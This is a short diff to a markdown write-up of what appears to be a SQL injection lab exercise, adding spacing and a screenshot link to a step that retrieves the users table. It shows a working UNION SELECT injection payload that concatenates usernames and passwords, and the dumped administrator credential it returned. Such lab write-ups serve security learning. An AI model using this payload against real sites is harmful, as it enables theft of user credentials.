@@ -26,5 +26,8 @@ The second column is of string data type.
 ### step 3
 #### Retriving the contents of the users table
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users-- = response 200
+
 results = administrator~nc1ne4hr8o19e8j8kmws
+
+![image](https://user-images.githubusercontent.com/44478872/150288480-610ca2e9-a9e3-4c66-90ca-85cb79d0b822.png)
 
